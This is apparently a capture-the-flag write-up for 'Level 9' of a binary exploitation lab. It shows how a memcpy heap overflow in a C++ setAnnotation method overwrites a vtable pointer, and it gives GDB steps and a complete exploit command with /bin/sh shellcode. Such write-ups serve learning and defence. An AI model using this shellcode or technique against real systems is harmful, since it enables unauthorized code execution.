# LEVEL 9

## 💡 Explanation

In this level we have to:
1. Learn how to code in CPP LOL.
2. Check the main using GDB, we see a lot of weird things... It is coded in CPP; so actually to know that the functions are doing, we have to get inside of the function... bref
3. We see a call to a function `_Znwj@plt => new(unsigned int) ()` followed by a call to `_ZN1NC2Ei => N::N(int) ()`. Looks like a call to a CPP constructor followed by an assignation of the int received as an argument to a varible of the class.
4. Well, we continue a bit and we find a call to a weird fucntion `_ZN1N13setAnnotationEPc => N::setAnnotation(char*) ()`. It looks pretty much as a setter (a modifier function) which is going to set to the class variable `annotation` whatever it is passed as an argument. Getting inside of the function we see that it calls to `strlen` and then to `memcpy`, passing the result of `strlen` as an argument... 0 protection, easily exploitable! Trying a couple of things, we discover that the string that is passed to the function as an argument is the first argument that we pass to the program!
5. Now, since `memcpy` copies on the heap, we cannot access the EIP, and we cannot do any weird thing to get to change the GOT. BUT! After looking closer to how the two objects are stored in memory (breakpoint after memcpy, having passed a bunch of As == 61) we can see that the first 4 bytes are used to store a pointer to an instruction, then there's a lot of bytes (from 0x804a00c until 0x804a068) to store the variable "annotation", next 4 more bytes which store the value of the number we put before and last 4 bytes that have something that we don't care.
6. Concluding, we can use the overflow of `memcpy` to write up to the address pointed by the first 4 bytes of the second object, so when it is used it'll reference an addres that we have written. This is pretty tricky because it is not a single pointer, it is a pointer to a pointer. Therefore, we'll have to put an address (1st pointer) and then on that address put the reference to our shellcode (2nd pointer). Voilà
7. The exploit has to be built like: [ADDRESS TO THE SHELLCODE => 2ND PTR][SHELLCODE][RANDOM BYTES][ADDRESS TO THE 2ND PTR => 1ST POINTER]. This is pure bricolage... We created a pattern, but then we cannot search for the pattern because it is not on the stack, so we check what do we have on memory where it crashed and calculate the lenght up to that point which is 108 bytes. Now, or shellcode is 45, and we also need 4 bytes for the address:=> 108 - 45 - 4 = 59.

## 👾 Commands

To find the solution:
```
[GDB] b *0x0804867c
[GDB] x/56xw 0x804a008
[GDB] pattern create 200
[GDB] run <created_patter>
```

To execute the solution:
- `/home/user/level9/level9 $(python -c 'print "\x10\xa0\x04\x08" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x90"*59 + "\x0c\xa0\x04\x08"')`
